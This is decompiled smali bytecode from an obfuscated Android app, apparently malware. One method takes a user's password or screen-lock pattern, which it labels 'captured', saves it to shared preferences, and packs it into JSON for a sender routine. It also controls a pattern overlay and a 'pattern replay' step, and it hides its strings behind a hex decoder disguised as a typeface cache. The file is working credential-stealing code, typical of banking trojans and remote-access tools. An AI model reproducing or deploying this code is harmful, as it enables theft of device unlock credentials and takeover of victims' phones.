.class public final Lv/s/apQOLJtARzrH;
.super Lv/s/LGm23hksIOxB;
.source "r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091"

# interfaces
.implements Lv/s/deLJ4Z0aL3hcJ3O1;


# instance fields
.field public final synthetic JXn4Qf7zpnLjP5:Landroid/content/Context;

.field public final synthetic vekpFI4d1Nc4fakF:I


# direct methods
.method public synthetic constructor <init>(Landroid/content/Context;I)V
    .locals 0

    .line 1
    iput p2, p0, Lv/s/apQOLJtARzrH;->vekpFI4d1Nc4fakF:I

    .line 2
    .line 3
    iput-object p1, p0, Lv/s/apQOLJtARzrH;->JXn4Qf7zpnLjP5:Landroid/content/Context;

    .line 4
    .line 5
    const/4 p1, 0x1

    nop

    .line 6
    invoke-direct {p0, p1}, Lv/s/LGm23hksIOxB;-><init>(I)V

    .line 7
    .line 8
    .line 9
    return-void
.end method


# virtual methods
.method public final pyu8ovAipBTLYAiKab(Ljava/lang/Object;)Ljava/lang/Object;
    .locals 9

    .line 1
    iget v0, p0, Lv/s/apQOLJtARzrH;->vekpFI4d1Nc4fakF:I

    .line 2
    .line 3
    const-string v1, "002F00730055008000E400B7"

    .line 4
    .line 5
    const-string v2, "0037006F004B0082"

    .line 6
    .line 7
    const/4 v3, 0x0

    .line 8
    const-string v4, "00270073004D008E00F300BA00ED00B7002A0078"

    .line 9
    .line 10
    packed-switch v0, :pswitch_data_0

    .line 11
    .line 12
    .line 13
    check-cast p1, Ljava/lang/String;

    .line 14
    .line 15
    const-string v0, "003300770048009400E700B000C000A3"

    .line 16
    .line 17
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    .line 18
    .line 19
    .line 20
    move-result v5

    .line 21
    if-lez v5, :cond_0

    .line 22
    .line 23
    sget-object v5, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 24
    .line 25
    invoke-virtual {v5}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 26
    .line 27
    .line 28
    invoke-static {p1}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setCapturedPassword$cp(Ljava/lang/String;)V

    .line 29
    .line 30
    .line 31
    :try_start_0
    iget-object p1, p0, Lv/s/apQOLJtARzrH;->JXn4Qf7zpnLjP5:Landroid/content/Context;

    .line 32
    .line 33
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 34
    .line 35
    .line 36
    move-result-object v4

    .line 37
    invoke-virtual {p1, v4, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 38
    .line 39
    .line 40
    move-result-object p1

    .line 41
    invoke-interface {p1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    .line 42
    .line 43
    .line 44
    move-result-object p1

    .line 45
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 46
    .line 47
    .line 48
    move-result-object v3

    .line 49
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getCapturedPassword$cp()Ljava/lang/String;

    .line 50
    .line 51
    .line 52
    move-result-object v4

    .line 53
    invoke-interface {p1, v3, v4}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 54
    .line 55
    .line 56
    move-result-object p1

    .line 57
    invoke-interface {p1}, Landroid/content/SharedPreferences$Editor;->apply()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 58
    .line 59
    .line 60
    :catch_0
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getTAG$cp()Ljava/lang/String;

    .line 61
    .line 62
    .line 63
    const-string p1, "001300770048009400E700B000C000A300630075005A009700E400AA00C000A200270036004D008E00F100FF00DD00B1002600640057008600E900E50092"

    .line 64
    .line 65
    invoke-static {p1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 66
    .line 67
    .line 68
    const-string p1, "006300750053008600E200AC"

    .line 69
    .line 70
    invoke-static {p1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 71
    .line 72
    .line 73
    :try_start_1
    sget-object p1, Lv/s/RWY6BVSB0XxPbw;->d6c98qX7r0XzUZFibx:Lv/s/iStgVlW5d7CQ5MhFi;

    nop

    .line 74
    .line 75
    sget-object p1, Lv/s/RWY6BVSB0XxPbw;->GUsyOYEIobMSb6n:Lv/s/RWY6BVSB0XxPbw;

    .line 76
    .line 77
    if-eqz p1, :cond_0

    .line 78
    .line 79
    new-instance v3, Lorg/json/JSONObject;

    .line 80
    .line 81
    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    .line 82
    .line 83
    .line 84
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 85
    .line 86
    .line 87
    move-result-object v2

    .line 88
    const-string v4, "003300770048009400E700B000C000A3001C0075005A009700E400AA00C000A20027"

    .line 89
    .line 90
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 91
    .line 92
    .line 93
    move-result-object v4

    nop

    nop

    .line 94
    invoke-virtual {v3, v2, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 95
    .line 96
    .line 97
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 98
    .line 99
    .line 100
    move-result-object v0

    .line 101
    sget-object v2, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 102
    .line 103
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 104
    .line 105
    .line 106
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getCapturedPassword$cp()Ljava/lang/String;

    .line 107
    .line 108
    .line 109
    move-result-object v2

    .line 110
    invoke-virtual {v3, v0, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 111
    .line 112
    .line 113
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 114
    .line 115
    .line 116
    move-result-object v0

    .line 117
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getCapturedPassword$cp()Ljava/lang/String;

    .line 118
    .line 119
    .line 120
    move-result-object v1

    nop

    .line 121
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    .line 122
    .line 123
    .line 124
    move-result v1

    .line 125
    invoke-virtual {v3, v0, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 126
    .line 127
    .line 128
    invoke-virtual {p1, v3}, Lv/s/RWY6BVSB0XxPbw;->H9XlUr4OeMJFiXK(Lorg/json/JSONObject;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 129
    .line 130
    .line 131
    :catch_1
    :cond_0
    sget-object p1, Lv/s/Eo0e0FTdv96U7KeCzoB;->dDIMxZXP1V8HdM:Lv/s/Eo0e0FTdv96U7KeCzoB;

    .line 132
    .line 133
    return-object p1

    .line 134
    :pswitch_0
    check-cast p1, Ljava/util/List;

    .line 135
    .line 136
    const-string v0, "00330077004F009300F500AD00DC"

    .line 137
    .line 138
    invoke-static {v3}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setPatternOverlayShowing$cp(Z)V

    .line 139
    .line 140
    .line 141
    invoke-interface {p1}, Ljava/util/List;->size()I

    .line 142
    .line 143
    .line 144
    move-result v5

    .line 145
    const/16 v6, 0x4

    .line 146
    if-lt v5, v6, :cond_3

    .line 147
    .line 148
    new-instance v5, Ljava/util/ArrayList;

    .line 149
    .line 150
    invoke-static {p1}, Lv/s/D8f4u3NB1PCAS427;->xfn2GJwmGqs7kWW(Ljava/lang/Iterable;)I

    .line 151
    .line 152
    .line 153
    move-result v6

    .line 154
    invoke-direct {v5, v6}, Ljava/util/ArrayList;-><init>(I)V

    .line 155
    .line 156
    .line 157
    invoke-interface {p1}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    .line 158
    .line 159
    .line 160
    move-result-object p1

    .line 161
    :goto_0
    invoke-interface {p1}, Ljava/util/Iterator;->hasNext()Z

    .line 162
    .line 163
    .line 164
    move-result v6

    .line 165
    const/4 v7, 0x1

    .line 166
    if-eqz v6, :cond_1

    .line 167
    .line 168
    invoke-interface {p1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 169
    .line 170
    .line 171
    move-result-object v6

    .line 172
    check-cast v6, Ljava/lang/Number;

    .line 173
    .line 174
    invoke-virtual {v6}, Ljava/lang/Number;->intValue()I

    .line 175
    .line 176
    .line 177
    move-result v6

    .line 178
    add-int/2addr v6, v7

    .line 179
    invoke-static {v6}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    .line 180
    .line 181
    .line 182
    move-result-object v6

    .line 183
    invoke-virtual {v5, v6}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 184
    .line 185
    .line 186
    goto :goto_0

    .line 187
    :cond_1
    const/4 p1, 0x0

    .line 188
    const v6, 0x3e

    .line 189
    .line 190
    const-string v8, ""

    .line 191
    .line 192
    invoke-static {v5, v8, p1, v6}, Lv/s/imhBI9RqzETHtVIJe;->euF5Udt5Rqv3Qmea(Ljava/util/Collection;Ljava/lang/String;Lv/s/deLJ4Z0aL3hcJ3O1;I)Ljava/lang/String;

    .line 193
    .line 194
    .line 195
    move-result-object p1

    .line 196
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getTAG$cp()Ljava/lang/String;

    .line 197
    .line 198
    .line 199
    const-string v5, "00130077004F009300F500AD00DC00E700200077004B009300E500AD00D700A3006300600052008600B000B000C400A20031007A005A009E00AA00FF"

    .line 200
    .line 201
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 202
    .line 203
    .line 204
    const-string v5, "00630075005E008B00FC00AC009B"

    .line 205
    .line 206
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 207
    .line 208
    .line 209
    invoke-static {v7}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setPatternReplayInProgress$cp(Z)V

    .line 210
    .line 211
    .line 212
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 213
    .line 214
    .line 215
    move-result-wide v5

    .line 216
    invoke-static {v5, v6}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setLastPatternCaptureTime$cp(J)V

    .line 217
    .line 218
    .line 219
    sget-object v5, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 220
    .line 221
    invoke-virtual {v5}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 222
    .line 223
    .line 224
    invoke-static {p1}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setCapturedPattern$cp(Ljava/lang/String;)V

    .line 225
    .line 226
    .line 227
    :try_start_2
    iget-object p1, p0, Lv/s/apQOLJtARzrH;->JXn4Qf7zpnLjP5:Landroid/content/Context;

    .line 228
    .line 229
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 230
    .line 231
    .line 232
    move-result-object v4

    .line 233
    invoke-virtual {p1, v4, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 234
    .line 235
    .line 236
    move-result-object p1

    .line 237
    invoke-interface {p1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    .line 238
    .line 239
    .line 240
    move-result-object p1

    .line 241
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 242
    .line 243
    .line 244
    move-result-object v3

    .line 245
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getCapturedPattern$cp()Ljava/lang/String;

    .line 246
    .line 247
    .line 248
    move-result-object v4

    .line 249
    invoke-interface {p1, v3, v4}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 250
    .line 251
    .line 252
    move-result-object p1

    .line 253
    invoke-interface {p1}, Landroid/content/SharedPreferences$Editor;->apply()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 254
    .line 255
    .line 256
    :catch_2
    :try_start_3
    sget-object p1, Lv/s/RWY6BVSB0XxPbw;->d6c98qX7r0XzUZFibx:Lv/s/iStgVlW5d7CQ5MhFi;

    .line 257
    .line 258
    sget-object p1, Lv/s/RWY6BVSB0XxPbw;->GUsyOYEIobMSb6n:Lv/s/RWY6BVSB0XxPbw;

    .line 259
    .line 260
    if-eqz p1, :cond_2

    .line 261
    .line 262
    new-instance v3, Lorg/json/JSONObject;

    .line 263
    .line 264
    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    .line 265
    .line 266
    .line 267
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 268
    .line 269
    .line 270
    move-result-object v2

    .line 271
    const-string v4, "00330077004F009300F500AD00DC009800200077004B009300E500AD00D700A3"

    .line 272
    .line 273
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 274
    .line 275
    .line 276
    move-result-object v4

    .line 277
    invoke-virtual {v3, v2, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 278
    .line 279
    .line 280
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 281
    .line 282
    .line 283
    move-result-object v0

    .line 284
    sget-object v2, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 285
    .line 286
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 287
    .line 288
    .line 289
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getCapturedPattern$cp()Ljava/lang/String;

    .line 290
    .line 291
    .line 292
    move-result-object v2

    .line 293
    invoke-virtual {v3, v0, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 294
    .line 295
    .line 296
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 297
    .line 298
    .line 299
    move-result-object v0

    .line 300
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getCapturedPattern$cp()Ljava/lang/String;

    .line 301
    .line 302
    .line 303
    move-result-object v1

    .line 304
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    .line 305
    .line 306
    .line 307
    move-result v1

    .line 308
    invoke-virtual {v3, v0, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 309
    .line 310
    .line 311
    const-string v0, "003500730049008E00F600B600D700A3"

    .line 312
    .line 313
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 314
    .line 315
    .line 316
    move-result-object v0

    nop

    nop

    .line 317
    invoke-virtual {v3, v0, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 318
    .line 319
    .line 320
    invoke-virtual {p1, v3}, Lv/s/RWY6BVSB0XxPbw;->H9XlUr4OeMJFiXK(Lorg/json/JSONObject;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    .line 321
    .line 322
    .line 323
    :catch_3
    :cond_2
    new-instance p1, Landroid/os/Handler;

    .line 324
    .line 325
    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    .line 326
    .line 327
    .line 328
    move-result-object v0

    .line 329
    invoke-direct {p1, v0}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 330
    .line 331
    .line 332
    new-instance v0, Lv/s/jdOQeRk37T35X5xKW1P;

    .line 333
    .line 334
    const/16 v1, 0x4

    nop

    nop

    add-int/lit8 v1, v1, 0x4

    .line 335
    .line 336
    invoke-direct {v0, v1}, Lv/s/jdOQeRk37T35X5xKW1P;-><init>(I)V

    .line 337
    .line 338
    .line 339
    const-wide/16 v1, 0x2710

    .line 340
    .line 341
    invoke-virtual {p1, v0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 342
    .line 343
    .line 344
    :cond_3
    sget-object p1, Lv/s/Eo0e0FTdv96U7KeCzoB;->dDIMxZXP1V8HdM:Lv/s/Eo0e0FTdv96U7KeCzoB;

    nop

    .line 345
    .line 346
    return-object p1

    nop

    .line 347
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
    .end packed-switch
.end method
